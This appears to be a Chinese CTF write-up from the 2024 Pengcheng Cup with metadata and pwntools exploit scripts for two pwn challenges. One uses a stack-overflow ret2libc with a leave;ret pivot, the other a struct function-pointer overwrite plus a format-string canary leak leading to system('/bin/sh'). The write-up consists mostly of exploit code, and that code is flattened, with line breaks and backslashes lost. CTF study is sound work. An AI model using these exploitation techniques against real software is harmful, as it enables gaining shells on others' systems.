---
title: web选手入门pwn(29) 鹏城杯
contest: 鹏城杯
year: 2024
difficulty: medium
vuln_type: rop
tags:
- ret2libc
- struct-func-ptr
- leave-ret-pivot
- format-string-leak
- gets-overflow
attack_chain: '题目1(bank) send A*20 触发栈溢出 → sendlineafter(you?) sendlineafter(withdraw?) 走业务/finish payload = p64(got_write)+A*0x50+p64(0x4010D0) 让 ROP 回到 start 重入/finish payload = p64(got_write)+ret+pop_rdi(binsh)+system+...+p64(stack_addr-360)+leave/题目2(animals) ptr_obj.state+name+attr+desc+func/写3个动物ptr: bird.func=start让其执行start泄露canary(%23$p)/写bird.func=system+cat.name=/bin/sh+dog call func调用'
key_payload: 题目1 leave; ret 让 rsp 跳到 0x55555555b700 (即栈上我们布置的 ROP 区)  题目2 bird.func=system + cat.name="/bin/sh\x00" + dog 触发 func
one_liner: 鹏城杯两题：银行系统栈溢出 + ROP/leave 跳板 + 函数指针伪造调用。
lesson: leave; ret 跳板把 rsp 跳到已知地址（提前布置 ROP 的位置）；结构体 func 字段是经典的"伪函数指针"目标，先把 name 写成 "/bin/sh" 再改 func=system 即可 shell。
quality: high
full_path: web选手入门pwn(29)——鹏城杯.full.md
meta_path: web选手入门pwn(29)——鹏城杯.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: web选手入门pwn(29) 鹏城杯。鹏城杯两题：银行系统栈溢出 + ROP/leave 跳板 + 函数指针伪造调用。。经验：leave; ret 跳板把 rsp 跳到已知地址（提前布置 ROP 的位置）；结构体 func 字段是经典的"伪函数...
category: pwn
subcategory: pwn_other
tools_used:
- ROP
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/287505.html
reasoning_chain:
- 题目 1 bank 系统 send A*20 触发栈溢出 + save/withdraw 业务菜单 → 触发点：栈溢出 + 业务菜单交互
- 假设：业务菜单触发 sure 时填 p64(got_write) + 'A'*0x50 + p64(start) 回到 start 重入 → 动作：循环 leak write_addr
- 观察：u64(sh.recvuntil('x7f')[-6:]+b'x00x00') 泄 write_addr → libc_base=write_addr-libc_write
- 假设：业务菜单拿 stack_addr → 动作：payload p64(got_write)+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)+'A'*40+p64(stack_addr-360)+p64(leave)
- 观察：leave;ret 把 rsp 跳到 0x55555555b700（栈上布置的 ROP 区）→ 完成题目 1
- 题目 2 animals 系统 bird.func/cat.name/dog 触发 → 触发点：结构体 func 字段是伪函数指针
- 动作：写 bird.ptr->func=start + cat.ptr->name=%23$p（fmt 漏 canary）→ 触发 dog.call func 泄 canary
- 下一步：bird.ptr->func=system + cat.ptr->name='/bin/sh\x00' → dog.call func → system('/bin/sh') → 完成
failed_attempts:
- 题目 1 试图直接 ROP → 失败：必须先 leak write/stack
- 题目 1 试图覆盖 canary → 失败：未泄 canary 无法绕过
- 题目 2 试图直接 cat.name 触发 fmt → 失败：fmt 漏点要 bird.func=start 才能跑
key_observations:
- leave;ret 跳板把 rsp 跳到已知地址（提前布置 ROP 的位置）
- 结构体 func 字段是经典的'伪函数指针'目标，先把 name 写成 /bin/sh 再改 func=system 即可 shell
- 业务菜单的 sure/save/withdraw 字段是漏洞注入点
- fmt 漏 canary 时 cat.name='%23$p' 配合 bird.func=start 触发
prerequisites:
- ROP 基础（leave;ret 跳板 / pop rdi + system）
- 格式化字符串漏洞（%N$p 泄漏 canary）
- Pwntools / pwncli 模块使用
- 结构体函数指针攻击（伪 vtable）
---
# web选手入门pwn(29)——鹏城杯

> 原文: https://www.ctfiot.com/287505.html
> ID: 287505

#!/usr/bin/env pythonfrompwn import *context.log_level ='debug'context.arch='amd64'context.terminal = ['tmux','splitw','-h']#sh = remote('xxx',8080)#sh = process("./pwn")sh = gdb.debug("./pwn","b mainnb Businessnb *0x40139anb *0x40130en c")elf = ELF("./pwn")libc = ELF("./libc.so.6")got_write = elf.got["write"]sh.send("A"*20)sh.sendlineafter("you?","1")sh.sendlineafter("withdraw?","10")sh.sendafter("sure?", p64(got_write))sh.sendlineafter("you?","0")sh.sendlineafter("save?","10")sh.interactive()

sh.sendafter("sure?", p64(got_write)+"A"*8+"B"*8+"C"*8+"D"*8+"E"*8+"F"*8+"G"*8+"H"*8+"I"*8+"J"*8+"K"*8)

sh.sendafter("sure?", p64(got_write)+"A"*0x50+p64(0x4010D0))

#!/usr/bin/env pythonfrompwnimport*context.log_level ='debug'context.arch='amd64'context.terminal = ['tmux','splitw','-h']#sh = remote('xxx',8080)sh = process("./pwn")#sh = gdb.debug("./pwn","b mainnb Businessnb *0x40139anb *0x40130en c")elf = ELF("./pwn")libc = ELF("./libc.so.6")rop = ROP(libc)got_write = elf.got["write"]libc_write = libc.sym['write']start =0x4010D0leave =0x4013C8ret =0x4013C9#start1sh.send("A"*20)sh.sendlineafter("you?","1")sh.sendlineafter("withdraw?","10")sh.sendafter("sure?", p64(got_write)+"A"*0x50+p64(start))sh.sendlineafter("you?","0")sh.sendlineafter("save?","10")write_addr = u64(sh.recvuntil("x7f")[-6:]+b"x00x00")print("write_addr: "+hex(write_addr))base_addr = write_addr - libc_writeprint("base_addr: "+hex(base_addr))stack_addr = u64(sh.recvuntil("x7f")[-6:]+b"x00x00")print("stack_addr:"+hex(stack_addr))system = base_addr + libc.sym["system"]binsh = base_addr + libc.search("/bin/sh").next()pop_rdi = base_addr + rop.find_gadget(['pop rdi','ret'])[0]#start2sh.sendafter("x00x00n","A"*20)sh.sendlineafter("you?","1")sh.sendlineafter("withdraw?","10")sh.sendafter("sure?", p64(got_write) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system) +"A"*40+ p64(stack_addr -360) + p64(leave))sh.interactive()

#sh.sendafter("sure?", p64(got_write) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system) + "A"*40 + p64(stack_addr - 360) + p64(leave))one=[0x50a47, 0xebc81, 0xebc85, 0xebc88, 0xebce2, 0xebd3f, 0xebd43]sh.sendafter("sure?", p64(got_write) +"A"*0x48 + p64(stack_addr -0x98) + p64(one[6] + base_addr))

structptr_obj{intstate;charpad0[4];charname[32];intattr1;intattr2;chardesc[32];void(__fastcall *func)(char*);};

frompwn import *context.log_level = 'debug'context.arch='amd64'sh= gdb.debug("./pwn","b *0x55555555580bnb *0x555555555997nb *0x555555555642n c")#sh = process("./pwn")libc= ELF("./libc.so.6")#1 dog#0x555555555642#2 cat#0x55555555580b#3 bird#0x555555555997#ptr#0x55555555b2a0base_text= int(sh.recvuntil("2c9")[-12:],16) -0x12c9print("base_text:"+hex(base_text))sh.sendlineafter("n","3")sh.sendlineafter("x90x97n","yes")sh.sendlineafter("xbcx9fn","yes")sh.sendlineafter("x90xa7n","A"*4+"B"*8+"C"*8+"D"*8+"E"*8+"F"*8)sh.sendlineafter("2c9n","1")sh.interactive()

base_text= int(sh.recvuntil("2c9")[-12:],16) -0x12c9print("base_text:"+hex(base_text))ret= base_text+0x12FAputs_plt= base_text+0x1140puts_got= base_text+0x3F88sh.sendlineafter("n","3")sh.sendlineafter("x90x97n","yes")sh.sendlineafter("xbcx9fn","yes")sh.sendlineafter("x90xa7n","A"*4+ p64(ret) +"C"*8+"D"*8+"E"*8+ p64(puts_plt))sh.sendlineafter("2c9n","2")sh.sendlineafter("xbcx9fn","yes")sh.sendlineafter("x90xa7n",p64(puts_got))sh.sendlineafter("2c9n","1")sh.interactive()

base_text=int(sh.recvuntil("2c9")[-12:],16)-0x12c9print("base_text:"+hex(base_text))ret=base_text+0x12FAstart=base_text+0x11e0sh.sendlineafter("n","3")sh.sendlineafter("x90x97n","yes")sh.sendlineafter("xbcx9fn","yes")sh.sendlineafter("x90xa7n","A"*4+p64(ret)+"B"*24+p64(start))sh.sendlineafter("2c9n","2")sh.sendlineafter("xbcx9fn","yes")sh.sendlineafter("x90xa7n","%23$p")sh.sendlineafter("2c9n","1")sh.interactive()

frompwn import *context.log_level = 'debug'context.arch='amd64'#sh = gdb.debug("./pwn", "b *0x55555555580bnb *0x555555555997nb *0x555555555642n c")sh= process("./pwn")libc= ELF("./libc.so.6")#1 dog#0x555555555642#2 cat#0x55555555580b#3 bird#0x555555555997#ptr#0x55555555b2a0base_text= int(sh.recvuntil("2c9")[-12:],16) -0x12c9print("base_text:"+hex(base_text))ret= base_text+0x12FAstart= base_text+0x11e0#bird ptr->func=startsh.sendlineafter("n","3")sh.sendlineafter("x90x97n","yes")sh.sendlineafter("xbcx9fn","yes")sh.sendlineafter("x90xa7n","A"*4+ p64(ret) +"B"*24+ p64(start))#cat ptr->name=%23psh.sendlineafter("2c9n","2")sh.sendlineafter("xbcx9fn","yes")sh.sendlineafter("x90xa7n","%23$p")#dog call ptr->func=startsh.sendlineafter("2c9n","1")base_libc= int(sh.recvuntil("d90")[-12:],16) -0x29d90print("base_libc:"+hex(base_libc))system= base_libc + libc.sym["system"]#bird ptr->func=systemsh.sendlineafter("n","3")sh.sendlineafter("x90x97n","yes")sh.sendlineafter("xbcx9fn","yes")sh.sendlineafter("x90xa7n","A"*4+ p64(ret)+"B"*24+ p64(system))#cat ptr->name=/bin/shsh.sendlineafter("2c9n","2")sh.sendlineafter("xbcx9fn","yes")sh.sendlineafter("x90xa7n","/bin/shx00")#dog call ptr->func=systemsh.sendlineafter("2c9n","1")#sh.interactive()


```
#!/usr/bin/env pythonfrompwn import *context.log_level ='debug'context.arch='amd64'context.terminal = ['tmux','splitw','-h']#sh = remote('xxx',8080)#sh = process("./pwn")sh = gdb.debug("./pwn","b mainnb Businessnb *0x40139anb *0x40130en c")elf = ELF("./pwn")libc = ELF("./libc.so.6")got_write = elf.got["write"]sh.send("A"*20)sh.sendlineafter("you?","1")sh.sendlineafter("withdraw?","10")sh.sendafter("sure?", p64(got_write))sh.sendlineafter("you?","0")sh.sendlineafter("save?","10")sh.interactive()
sh.sendafter("sure?", p64(got_write)+"A"*8+"B"*8+"C"*8+"D"*8+"E"*8+"F"*8+"G"*8+"H"*8+"I"*8+"J"*8+"K"*8)
sh.sendafter("sure?", p64(got_write)+"A"*0x50+p64(0x4010D0))
#!/usr/bin/env pythonfrompwnimport*context.log_level ='debug'context.arch='amd64'context.terminal = ['tmux','splitw','-h']#sh = remote('xxx',8080)sh = process("./pwn")#sh = gdb.debug("./pwn","b mainnb Businessnb *0x40139anb *0x40130en c")elf = ELF("./pwn")libc = ELF("./libc.so.6")rop = ROP(libc)got_write = elf.got["write"]libc_write = libc.sym['write']start =0x4010D0leave =0x4013C8ret =0x4013C9#start1sh.send("A"*20)sh.sendlineafter("you?","1")sh.sendlineafter("withdraw?","10")sh.sendafter("sure?", p64(got_write)+"A"*0x50+p64(start))sh.sendlineafter("you?","0")sh.sendlineafter("save?","10")write_addr = u64(sh.recvuntil("x7f")[-6:]+b"x00x00")print("write_addr: "+hex(write_addr))base_addr = write_addr - libc_writeprint("base_addr: "+hex(base_addr))stack_addr = u64(sh.recvuntil("x7f")[-6:]+b"x00x00")print("stack_addr:"+hex(stack_addr))system = base_addr + libc.sym["system"]binsh = base_addr + libc.search("/bin/sh").next()pop_rdi = base_addr + rop.find_gadget(['pop rdi','ret'])[0]#start2sh.sendafter("x00x00n","A"*20)sh.sendlineafter("you?","1")sh.sendlineafter("withdraw?","10")sh.sendafter("sure?", p64(got_write) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system) +"A"*40+ p64(stack_addr -360) + p64(leave))sh.interactive()
    #sh.sendafter("sure?", p64(got_write) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system) + "A"*40 + p64(stack_addr - 360) + p64(leave))one=[0x50a47, 0xebc81, 0xebc85, 0xebc88, 0xebce2, 0xebd3f, 0xebd43]sh.sendafter("sure?", p64(got_write) +"A"*0x48 + p64(stack_addr -0x98) + p64(one[6] + base_addr))
structptr_obj{intstate;charpad0[4];charname[32];intattr1;intattr2;chardesc[32];void(__fastcall *func)(char*);};
frompwn import *context.log_level = 'debug'context.arch='amd64'sh= gdb.debug("./pwn","b *0x55555555580bnb *0x555555555997nb *0x555555555642n c")#sh = process("./pwn")libc= ELF("./libc.so.6")#1 dog#0x555555555642#2 cat#0x55555555580b#3 bird#0x555555555997#ptr#0x55555555b2a0base_text= int(sh.recvuntil("2c9")[-12:],16) -0x12c9print("base_text:"+hex(base_text))sh.sendlineafter("n","3")sh.sendlineafter("x90x97n","yes")sh.sendlineafter("xbcx9fn","yes")sh.sendlineafter("x90xa7n","A"*4+"B"*8+"C"*8+"D"*8+"E"*8+"F"*8)sh.sendlineafter("2c9n","1")sh.interactive()
base_text= int(sh.recvuntil("2c9")[-12:],16) -0x12c9print("base_text:"+hex(base_text))ret= base_text+0x12FAputs_plt= base_text+0x1140puts_got= base_text+0x3F88sh.sendlineafter("n","3")sh.sendlineafter("x90x97n","yes")sh.sendlineafter("xbcx9fn","yes")sh.sendlineafter("x90xa7n","A"*4+ p64(ret) +"C"*8+"D"*8+"E"*8+ p64(puts_plt))sh.sendlineafter("2c9n","2")sh.sendlineafter("xbcx9fn","yes")sh.sendlineafter("x90xa7n",p64(puts_got))sh.sendlineafter("2c9n","1")sh.interactive()
base_text=int(sh.recvuntil("2c9")[-12:],16)-0x12c9print("base_text:"+hex(base_text))ret=base_text+0x12FAstart=base_text+0x11e0sh.sendlineafter("n","3")sh.sendlineafter("x90x97n","yes")sh.sendlineafter("xbcx9fn","yes")sh.sendlineafter("x90xa7n","A"*4+p64(ret)+"B"*24+p64(start))sh.sendlineafter("2c9n","2")sh.sendlineafter("xbcx9fn","yes")sh.sendlineafter("x90xa7n","%23$p")sh.sendlineafter("2c9n","1")sh.interactive()
frompwn import *context.log_level = 'debug'context.arch='amd64'#sh = gdb.debug("./pwn", "b *0x55555555580bnb *0x555555555997nb *0x555555555642n c")sh= process("./pwn")libc= ELF("./libc.so.6")#1 dog#0x555555555642#2 cat#0x55555555580b#3 bird#0x555555555997#ptr#0x55555555b2a0base_text= int(sh.recvuntil("2c9")[-12:],16) -0x12c9print("base_text:"+hex(base_text))ret= base_text+0x12FAstart= base_text+0x11e0#bird ptr->func=startsh.sendlineafter("n","3")sh.sendlineafter("x90x97n","yes")sh.sendlineafter("xbcx9fn","yes")sh.sendlineafter("x90xa7n","A"*4+ p64(ret) +"B"*24+ p64(start))#cat ptr->name=%23psh.sendlineafter("2c9n","2")sh.sendlineafter("xbcx9fn","yes")sh.sendlineafter("x90xa7n","%23$p")#dog call ptr->func=startsh.sendlineafter("2c9n","1")base_libc= int(sh.recvuntil("d90")[-12:],16) -0x29d90print("base_libc:"+hex(base_libc))system= base_libc + libc.sym["system"]#bird ptr->func=systemsh.sendlineafter("n","3")sh.sendlineafter("x90x97n","yes")sh.sendlineafter("xbcx9fn","yes")sh.sendlineafter("x90xa7n","A"*4+ p64(ret)+"B"*24+ p64(system))#cat ptr->name=/bin/shsh.sendlineafter("2c9n","2")sh.sendlineafter("xbcx9fn","yes")sh.sendlineafter("x90xa7n","/bin/shx00")#dog call ptr->func=systemsh.sendlineafter("2c9n","1")#sh.interactive()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]